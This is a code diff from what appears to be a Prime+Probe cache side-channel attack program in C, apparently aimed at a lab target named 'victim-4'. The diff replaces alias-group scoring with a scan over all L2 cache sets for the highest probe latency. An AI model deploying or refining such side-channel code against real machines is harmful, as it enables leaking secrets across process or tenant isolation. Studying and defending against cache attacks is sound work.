@@ -39,7 +39,7 @@ void shuffle(int *arr) {
 }
 
 int main() {
-    /* works 2/3 of time. Randomize access, reverse probe, no usleep
+    /* works 2/3 of time on victim-4. Randomize access, reverse probe, no usleep
     */
     printf("Attacker ready. Prime+Probe starting...\n");
 
@@ -106,36 +106,16 @@ int main() {
             }
         }
 
-        /* Combine alias groups */
-        int best_group = 0;
-        uint64_t best_score = 0;
-
-        for(int base = 0; base < 256; base++) {
-
-            uint64_t group_score =
-                scores[base] +
-                scores[base + 256] +
-                scores[base + 512] +
-                scores[base + 768];
-
-            if(group_score > best_score) {
-                best_score = group_score;
-                best_group = base;
-            }
-        }
-
-        /* find best set within group */
-        int best_set = best_group;
+        int best_set = 0;
         uint64_t best_latency = 0;
 
-        for(int i = 0; i < 4; i++) {
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
-            int s = best_group + i*256;
-            uint64_t avg = scores[s] / REPEATS;
+            uint64_t avg = scores[set] / REPEATS;
 
             if(avg > best_latency) {
                 best_latency = avg;
-                best_set = s;
+                best_set = set;
             }
         }
 
